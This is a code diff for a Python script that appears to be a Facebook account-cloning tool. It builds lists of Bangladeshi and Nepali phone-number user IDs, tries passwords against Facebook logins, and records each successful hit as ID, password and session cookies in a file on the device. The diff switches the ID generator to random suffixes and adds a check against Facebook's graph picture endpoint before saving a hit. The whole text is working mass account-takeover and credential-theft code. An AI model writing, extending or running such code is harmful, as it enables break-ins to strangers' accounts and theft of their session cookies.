@@ -803,18 +803,18 @@ def ran():
     elif ask in ["2", "02", "b", "B"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]01710185019")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]0171, 0185, 0192 etc")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
-        # for i in range(limit):
-        #     data = str(random.choice(range(1000000, 9999999)))
-        #     user.append(data)
         for i in range(limit):
-            data = str(int(code) + i)
+            data = str(random.choice(range(1000000, 9999999)))
             user.append(data)
+        #for i in range(limit):
+            #data = str(int(code) + i)
+            #user.append(data)
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]NEPAL Number")
         print(sort.line())
@@ -871,7 +871,7 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 uid = "91" + xd
             elif ask in ["2", "02", "b", "B"]:
-                uid = "0" + xd
+                uid = code + xd
             else:
                 uid = code + xd
             
@@ -939,10 +939,16 @@ def ren_sub(uid, pwx, meth, user, fb):
                 coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                 xx = coki.split("c_user=")[1]
                 xd = xx[:15]
-                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[🍪][spring_green1]{coki}")
-                open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
-                oks.append(xd)
-                break
+                res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
+                try:
+                    if "height" in res:
+                        print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[🍪][spring_green1]{coki}")
+                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                        oks.append(xd)
+                        break
+                except KeyError as e:
+                    pass
+                
                 
                 
                         
